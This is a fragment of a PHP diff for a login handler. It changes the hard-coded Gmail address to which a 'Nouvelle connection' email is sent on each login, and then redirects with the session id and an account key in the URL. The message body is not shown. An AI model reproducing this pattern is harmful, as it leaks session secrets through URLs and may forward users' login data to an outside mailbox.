@@ -52,7 +52,7 @@ if(isset($_POST['connexion']))
 
                       ";
 
-                      mail("arthurtesx@gmail.com","Nouvelle connection", $message, $header);
+                      mail("arthurteyssieux7@gmail.com","Nouvelle connection", $message, $header);
 
         header("Location: ../default.php?id=".$_SESSION['id']."&account_key=".$_SESSION['account_key']);
 
